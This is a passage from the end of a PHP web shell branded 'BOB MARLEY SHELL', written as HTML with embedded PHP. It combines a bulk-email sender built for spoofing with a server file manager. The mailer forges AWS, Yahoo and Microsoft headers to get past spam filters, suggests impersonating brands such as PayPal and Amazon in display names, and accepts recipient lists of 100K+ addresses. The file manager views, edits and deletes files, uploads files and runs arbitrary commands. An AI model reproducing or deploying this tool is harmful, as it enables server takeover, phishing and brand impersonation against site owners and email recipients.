                                        <input type="password" name="smtp_pass" id="smtp_pass" placeholder="Password" style="width: 95%; padding: 6px; background: #000; color: #0f0; border: 1px solid #0f0;">
                                    </td>
                                </tr>
                            </table>
                        </td>
                    </tr>
                    
                    <tr>
                        <td style="border: none; width: 150px; padding: 5px; vertical-align: top;">
                            <label style="color: #0f0; display: block; margin-bottom: 3px;">From Email</label>
                        </td>
                        <td style="border: none; padding: 5px;">
                            <input type="text" name="smtp_from_email" id="smtp_from_email" placeholder="sender@example.com" style="width: 95%; padding: 6px; background: #000; color: #0f0; border: 1px solid #0f0;">
                        </td>
                    </tr>
                    
                    <tr>
                        <td colspan="2" style="border: none; padding: 10px 5px;">
                            <div style="background: #001100; padding: 10px; border: 1px solid #ffff00;">
                                <table style="width: 100%; border: none;">
                                    <tr>
                                        <td style="border: none; width: 200px;">
                                            <label style="color: #ffff00;">Config Name (to save):</label>
                                        </td>
                                        <td style="border: none;">
                                            <input type="text" name="config_name" placeholder="My SMTP Config" style="width: 50%; padding: 6px; background: #000; color: #0f0; border: 1px solid #0f0; margin-right: 10px;">
                                            <input type="submit" name="save_smtp_config" value="Save Config" style="padding: 6px 20px; background: #003300; color: #0f0; border: 1px solid #0f0; cursor: pointer;">
                                        </td>
                                    </tr>
                                </table>
                            </div>
                        </td>
                    </tr>
                </tbody>
                
                <tr>
                    <td colspan="2" style="border: none; padding: 10px 0;">
                        <strong style="color: #00ffff;">Sender Information & Spoofing</strong>
                    </td>
                </tr>
                <tr>
                    <td style="border: none; width: 150px;">Sender Name:</td>
                    <td style="border: none;">
                        <input type="text" name="sender_name" placeholder="Your Name or Company" style="width: 95%;" value="System">
                        <div style="color: #ffff00; font-size: 10px; margin-top: 2px;">Tip: Use spaces or special chars for display name spoofing</div>
                    </td>
                </tr>
                <tr>
                    <td style="border: none;">Sender Email:</td>
                    <td style="border: none;">
                        <input type="text" name="sender_email" placeholder="email@domain.com" style="width: 95%;" value="noreply@<?php echo $_SERVER['HTTP_HOST'] ?: 'localhost.com'; ?>">
                    </td>
                </tr>
                <tr>
                    <td style="border: none;">Reply-To Email:</td>
                    <td style="border: none;">
                        <input type="text" name="reply_to" placeholder="Different reply address (optional)" style="width: 95%;">
                        <div style="color: #ffff00; font-size: 10px; margin-top: 2px;">Leave blank to use sender email</div>
                    </td>
                </tr>
                <tr>
                    <td style="border: none;">Spoof Headers:</td>
                    <td style="border: none;">
                        <select name="spoof_type" id="spoof_type" style="padding: 5px; width: 50%;">
                            <option value="none">None (Normal Headers)</option>
                            <option value="aws_ses">AWS SES (Amazon WorkMail)</option>
                            <option value="yahoo">Yahoo Mail</option>
                            <option value="microsoft">Microsoft Outlook/Exchange</option>
                            <option value="custom">Custom Headers (Anti-Spam)</option>
                        </select>
                        <div style="color: #ffff00; font-size: 10px; margin-top: 2px;">Adds fake headers to bypass spam filters</div>
                    </td>
                </tr>
                <tr>
                    <td style="border: none;">X-Mailer:</td>
                    <td style="border: none;">
                        <label style="font-size:11px;">
                            <input type="checkbox" name="include_x_mailer" value="1" checked>
                            Include X-Mailer PHP header when spoof is None
                        </label>
                        <div style="color:#888;font-size:10px;margin-top:2px;">X-Priority: 3 is always sent</div>
                    </td>
                </tr>
                
                <tr>
                    <td colspan="2" style="border: none; padding: 5px 0;">
                        <div id="spoof_info" style="background: #110011; border: 1px solid #ff00ff; padding: 10px; display: none;">
                            <strong style="color: #ff00ff;">Spoof Headers Info:</strong>
                            <div id="spoof_details" style="color: #cc00cc; font-size: 11px; margin-top: 5px;"></div>
                        </div>
                    </td>
                </tr>
                
                <tr>
                    <td colspan="2" style="border: none; padding: 10px 0;">
                        <strong style="color: #00ffff;">Message Details</strong>
                    </td>
                </tr>
                <tr>
                    <td style="border: none;">Subject:</td>
                    <td style="border: none;">
                        <input type="text" name="subject" placeholder="Email Subject" style="width: 95%;">
                    </td>
                </tr>
                <tr>
                    <td style="border: none;">Mail Type:</td>
                    <td style="border: none;">
                        <select name="mail_type" id="mail_type" style="padding: 5px;" onchange="updatePlaceholder()">
                            <option value="text">Plain Text</option>
                            <option value="html">HTML</option>
                        </select>
                        <button type="button" onclick="insertHTMLTemplate()" style="margin-left: 10px; padding: 4px 10px;">Insert HTML Template</button>
                    </td>
                </tr>
                <tr>
                    <td style="border: none; vertical-align: top;">Message:</td>
                    <td style="border: none;">
                        <textarea name="message" style="width: 95%; height: 300px; font-family: monospace;" placeholder="Your message here (HTML or Text)..."></textarea>
                        <div style="color: #ffff00; font-size: 11px; margin-top: 3px;">
                            For HTML: Use complete HTML code. Auto-wraps in &lt;html&gt;&lt;body&gt; if needed.
                        </div>
                    </td>
                </tr>
                
                <tr>
                    <td colspan="2" style="border: none; padding: 10px 0;">
                        <strong style="color: #00ffff;">Recipients</strong>
                    </td>
                </tr>
                <tr>
                    <td style="border: none; vertical-align: top;">Single Recipient:</td>
                    <td style="border: none;">
                        <input type="text" name="single_recipient" placeholder="email@example.com" style="width: 95%;">
                        <div style="color: #ffff00; font-size: 11px; margin-top: 3px;">For single email only</div>
                    </td>
                </tr>
                <tr>
                    <td style="border: none; vertical-align: top;">Upload Email List:</td>
                    <td style="border: none;">
                        <input type="file" name="recipient_file" accept=".txt,.csv" style="color: #0f0;">
                        <div style="color: #ffff00; font-size: 11px; margin-top: 3px;">
                             Upload .txt or .csv file (one email per line) - Best for 100K+ emails
                        </div>
                    </td>
                </tr>
                <tr>
                    <td style="border: none; vertical-align: top;">OR Paste List:</td>
                    <td style="border: none;">
                        <textarea name="recipient_list" style="width: 95%; height: 120px;" placeholder="email1@example.com&#10;email2@example.com&#10;email3@example.com"></textarea>
                        <div style="color: #ffff00; font-size: 11px; margin-top: 3px;">One email per line (not recommended for large lists)</div>
                    </td>
                </tr>
                
                <tr>
                    <td colspan="2" style="border: none; padding: 15px 0; text-align: center;">
                        <input type="submit" name="send_mail" value="Send Now" style="padding: 8px 30px; font-size: 14px; font-weight: bold; cursor: pointer;">
                        <div style="color: #ffff00; font-size: 10px; margin-top: 8px;">
                            Note: Check SPAM/Junk folders. For SMTP, verify credentials and FROM email is authorized.
                        </div>
                    </td>
                </tr>
            </table>
        </form>
        </div>
        
        <!-- RIGHT PANEL: Live Progress & History -->
        <div class="panel" style="flex: 1;">
            <h2 style="font-size: 14px; color: #00ffff;">Live Progress</h2>
            
            <!-- Live Status Bar -->
            <div id="live_status_panel" style="background: #001100; border: 1px solid #00ffff; padding: 10px; margin-bottom: 10px; display: none;">
                <div style="margin-bottom: 8px;">
                    <strong style="color: #00ffff;">Status:</strong> <span id="send_status" style="color: #0f0;">Ready</span>
                </div>
                <div style="margin-bottom: 8px;">
                    <strong style="color: #0f0;">Sent:</strong> <span id="sent_count">0</span> | 
                    <strong style="color: #f00;">Failed:</strong> <span id="failed_count">0</span> | 
                    <strong style="color: #fff;">Total:</strong> <span id="total_count">0</span>
                </div>
                <div style="background: #000; height: 20px; border: 1px solid #0f0; position: relative;">
                    <div id="progress_bar" style="background: #0f0; height: 100%; width: 0%; transition: width 0.3s;"></div>
                    <div style="position: absolute; top: 2px; left: 50%; transform: translateX(-50%); color: #000; font-weight: bold; font-size: 11px;">
                        <span id="progress_text">0%</span>
                    </div>
                </div>
            </div>
            
            <!-- Live Email List -->
            <div id="live_email_list" style="background: #000; border: 1px solid #0f0; padding: 10px; max-height: 400px; overflow-y: auto; display: none;">
                <strong style="color: #0f0;">Email Queue:</strong>
                <div id="email_items" style="margin-top: 5px; font-size: 10px;">
                    <!-- Emails will be added here dynamically -->
                </div>
            </div>
            
            <!-- History -->
            <div style="background: #001100; border: 1px solid #0f0; padding: 10px; margin-top: 10px;">
                <strong style="color: #0f0;">Send History (Recent)</strong>
                <div style="margin-top: 10px; font-size: 11px; max-height: 150px; overflow-y: auto;">
                    <?php
                    $history_file = $dir . '/.mailer_history.log';
                    if (file_exists($history_file)) {
                        $history = array_reverse(array_slice(file($history_file), -10));
                        foreach ($history as $line) {
                            echo "<div style='color:#0f0; padding: 3px 0; border-bottom: 1px solid #003300;'>" . htmlspecialchars($line) . "</div>";
                        }
                    } else {
                        echo "<div style='color:#888;'>No history yet</div>";
                    }
                    ?>
                </div>
            </div>
            
            <div style="background: #110011; border: 1px solid #ff00ff; padding: 10px; margin-bottom: 10px;">
                <strong style="color: #ff00ff;">Saved SMTP Configs</strong>
                <div style="margin-top: 10px; font-size: 10px;">
                    <?php
                    $configs = file_exists($smtp_config_file) ? json_decode(file_get_contents($smtp_config_file), true) : [];
                    if (!empty($configs)) {
                        foreach ($configs as $name => $cfg) {
                            echo "<div style='color:#ff00ff; padding: 5px 0; border-bottom: 1px solid #330033;'>";
                            echo "<strong>" . htmlspecialchars($name) . "</strong><br>";
                            echo "<span style='color:#cc00cc;'>";
                            echo htmlspecialchars($cfg['host']) . ":" . $cfg['port'] . " (" . strtoupper($cfg['encryption']) . ")<br>";
                            if (!empty($cfg['from_email'])) {
                                echo "From: " . htmlspecialchars($cfg['from_email']);
                            }
                            echo "</span>";
                            echo "</div>";
                        }
                    } else {
                        echo "<div style='color:#888;'>No saved configs</div>";
                    }
                    ?>
                </div>
            </div>
            
            <div style="background: #001100; border: 1px solid #00ffff; padding: 10px;">
                <strong style="color: #00ffff;">Spoofing Capabilities</strong>
                <div style="margin-top: 8px; font-size: 10px; color: #0f0;">
                    <div style="padding: 3px 0;">✓ Rotating FROM Addresses</div>
                    <div style="padding: 3px 0;">✓ Custom From/Reply-To</div>
                    <div style="padding: 3px 0;">✓ AWS SES Headers</div>
                    <div style="padding: 3px 0;">✓ Yahoo Mail Headers</div>
                    <div style="padding: 3px 0;">✓ Microsoft Exchange Headers</div>
                    <div style="padding: 3px 0;">✓ Anti-Spam Score Headers</div>
                    <div style="padding: 3px 0;">✓ Random IP/ID Generation</div>
                    <div style="padding: 3px 0;">✓ Display Name Tricks</div>
                </div>
                <div style="margin-top: 5px; padding: 5px; background: #001122; border: 1px solid #0088ff; font-size: 9px; color: #00aaff;">
                    <strong>Display Name Tricks:</strong><br>
                    • "Amazon Security   " (trailing spaces)<br>
                    • "PayPal Support" &lt;fake@evil.com&gt;<br>
                    • "Google Inc." (impersonation)<br>
                    Headers randomize each send for uniqueness.
                </div>
            </div>
        </div>
    </div>
    <?php endif; // End if/else for sending_mail check ?>
    <?php endif; // End mailer mode ?>

    <!-- FILE MANAGER MODE (Only show if NOT in mailer mode) -->
    <?php if (!$mailer_mode): ?>
    
    <!-- RENAME PANEL -->
    <?php if ($renaming_file): ?>
    <div class="panel">
        <h2>Rename: <?php echo htmlspecialchars($renaming_file); ?></h2>
        <form method="POST">
            <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($renaming_file); ?>">
            New Name: <input type="text" name="new_name" value="<?php echo htmlspecialchars($renaming_file); ?>" style="width: 300px;">
            <input type="submit" name="rename_file" value="Rename">
            <button type="button" onclick="window.location.href='?dir=<?php echo urlencode($dir); ?>'">Cancel</button>
        </form>
    </div>
    <?php endif; ?>

    <!-- EDIT / VIEW PANEL -->
    <?php if ($editing_file): ?>
    <div class="panel">
        <h2><?php echo ($_GET['action'] == 'edit') ? "Edit":"View"; ?>: <?php echo $editing_file; ?></h2>
        <form method="POST">
            <input type="hidden" name="filename" value="<?php echo htmlspecialchars($editing_file); ?>">
            <textarea name="content" style="width: 100%; height: 250px;"><?php echo htmlspecialchars($view_content); ?></textarea><br>
            <?php if ($_GET['action'] == 'edit'): ?><input type="submit" name="save_file" value="Save Changes"><?php endif; ?>
            <button type="button" onclick="window.location.href='?dir=<?php echo urlencode($dir); ?>'">Close</button>
        </form>
    </div>
    <?php endif; ?>
    
    <!-- FILE MANAGER TABLE -->
    <table>
        <thead>
            <tr><th width="40%">Name</th><th width="10%">Size</th><th width="15%">Modified</th><th width="10%">Perms</th><th width="25%">Action</th></tr>
        </thead>
        <tbody>
            <tr><td><span class="dir">DIR</span> <a href="?dir=<?php echo urlencode(dirname($dir)); ?>">..</a></td><td colspan="4">--</td></tr>
            <?php
            $items = scandir($dir);
            foreach($items as $item) {
                if ($item == '.' || $item == '..') continue;
                $p = $dir . '/' . $item;
                $is_d = is_dir($p);
                $is_zip = strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'zip';
                echo "<tr>";
                echo "<td>";
                if ($is_d) {
                    echo "<span class='dir'>DIR</span>";
                } elseif ($is_zip) {
                    echo "<span class='zip'>ZIP</span>";
                } else {
                    echo "<span class='file'>FILE</span>";
                }
                echo " <a href='?dir=" . urlencode($is_d ? $p : $dir) . "'>$item</a></td>";
                echo "<td>" . ($is_d ? "DIR" : round(filesize($p)/1024, 2) . " KB") . "</td>";
                echo "<td>" . date("Y-m-d H:i", filemtime($p)) . "</td>";
                echo "<td><span style='color:".(get_perms($p)[0]=='d'?'#0f0':'#fff')."'>".get_perms($p)."</span></td>";
                echo "<td>
                    <a href='?dir=".urlencode($dir)."&item=".urlencode($item)."&action=view' title='View'>V</a> | 
                    <a href='?dir=".urlencode($dir)."&item=".urlencode($item)."&action=edit' title='Edit'>E</a> | 
                    <a href='?dir=".urlencode($dir)."&item=".urlencode($item)."&action=rename' title='Rename'>R</a>";
                if ($is_zip) {
                    echo " | <a href='?dir=".urlencode($dir)."&item=".urlencode($item)."&action=unzip' onclick='return confirm(\"Extract $item?\")' title='Unzip'>UZ</a>";
                }
                echo " | <a href='?dir=".urlencode($dir)."&item=".urlencode($item)."&action=delete' onclick='return confirm(\"Delete $item?\")' title='Delete'>D</a>
                </td>";
                echo "</tr>";
            }
            ?>
        </tbody>
    </table>

    <div class="panel">
        <h2>Command Center</h2>
        <form method="POST"><input type="text" name="cmd" style="width: 70%;" placeholder="Command..."> <input type="submit" name="execute_cmd" value="Execute"></form>
        <form method="POST" enctype="multipart/form-data" style="margin-top:10px;">
            Upload: <input type="file" name="file"> <input type="submit" name="upload_btn" value="Upload">
        </form>
        <div style="margin-top: 10px; display: flex; gap: 10px;">
            <form method="POST" style="flex: 1;">
                <input type="text" name="new_filename" placeholder="New file name..." style="width: 65%;">
                <input type="submit" name="create_file_btn" value="Create File">
            </form>
            <form method="POST" style="flex: 1;">
                <input type="text" name="new_foldername" placeholder="New folder name..." style="width: 60%;">
                <input type="submit" name="create_folder_btn" value="Create Folder">
            </form>
        </div>
    </div>

    <?php if ($cmd_out): ?><div class="output"><?php echo htmlspecialchars($cmd_out); ?></div><?php endif; ?>
    <?php endif; // End file manager mode ?>

    <div style="text-align: center; margin-top: 30px; font-size: 11px; color: #555;">BOB MARLEY SHELL | Enhanced Legend Edition</div>
</body>
</html>
